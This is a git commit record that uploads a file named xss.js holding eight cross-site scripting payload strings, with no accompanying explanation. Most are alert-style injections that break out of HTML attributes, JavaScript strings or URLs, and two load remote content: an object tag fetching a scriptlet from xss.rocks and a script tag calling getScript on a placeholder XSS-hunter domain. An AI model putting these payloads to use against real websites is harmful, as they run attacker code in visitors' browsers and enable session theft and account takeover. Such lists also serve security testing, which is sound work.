7bbe33fc36cb98a6670359c56d32c60542544a9f
thegreatnightmare <65444715+thegreatnightmare@users.noreply.github.com>
2025-10-28 11:07:03 -0400

    Add files via upload

---
+++ xss.js
@@ -0,0 +1,8 @@
+">]<img src=x onerror=alert(1)> ">]<img src=x onerror=alert(1)>
+"><img src=x onerror=prompt(2)>
+javascript:alert(3)
+ '|alert(4)|'
+<object type="text/x-scriptlet" data="https://xss.rocks/scriptlet.html"></object>
+injection%22%20style=%22animation-name:swoop-up%22%20onanimationstart=%22alert(6)
+}}});};alert(7);if(1==2){k=new Promise(function(){if(1==2){v={e: 1
+“><script>$.getScript(“//xsshunterdomain”)</script>
